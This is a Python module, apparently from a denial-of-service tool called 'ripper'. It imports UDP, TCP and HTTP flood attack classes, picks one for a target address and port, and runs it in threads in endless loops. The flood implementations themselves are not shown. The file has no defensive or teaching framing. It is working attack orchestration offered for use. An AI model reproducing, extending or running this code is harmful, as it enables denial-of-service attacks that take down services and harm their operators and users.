import threading
from threading import Thread

from ripper.actions.attack_method import AttackMethod
from ripper.actions.http_flood import HttpFlood
from ripper.actions.tcp_flood import TcpFlood
from ripper.actions.udp_flood import UdpFlood

# Forward Reference
Context = 'Context'
Target = 'Target'


attack_methods: list[AttackMethod] = [
    UdpFlood,
    TcpFlood,
    HttpFlood,
]

attack_method_labels: list[str] = list(map(lambda am: am.label, attack_methods))


def attack_method_factory(_ctx: Context, target: Target):
    attack_method_name = target.attack_method
    if attack_method_name == 'udp-flood':
        return UdpFlood(target=target, _ctx=_ctx)
    elif attack_method_name == 'http-flood':
        return HttpFlood(target=target, _ctx=_ctx)
    elif attack_method_name == 'tcp-flood':
        return TcpFlood(target=target, _ctx=_ctx)
    # Dangerours, may lead to exception
    return None


class __Attack(Thread):
    """This class creates threads with specified attack method."""
    _ctx: Context
    target: Context

    def __init__(self, _ctx: Context, target: Target):
        """
        :param target: Target IPv4 address and destination port.
        :param method: Attack method.
        """
        Thread.__init__(self, daemon=True)
        self._ctx = _ctx
        self.target = target

    def run(self):
        runner = attack_method_factory(target=self.target, _ctx=self._ctx)

        if self._ctx.dry_run:
            runner()
            exit(0)

        while not threading.Event().is_set():
            runner()

class Attack:
    """This class creates threads with specified attack method."""
    _ctx: Context
    target: Context

    def __init__(self, _ctx: Context, target: Target):
        """
        :param _ctx: Global context.
        :param target: Attack target.
        """
        self._ctx = _ctx
        self.target = target

    def start(self):
        runner = attack_method_factory(target=self.target, _ctx=self._ctx)

        if self._ctx.dry_run:
            runner()
            exit(0)

        while True:
            runner()
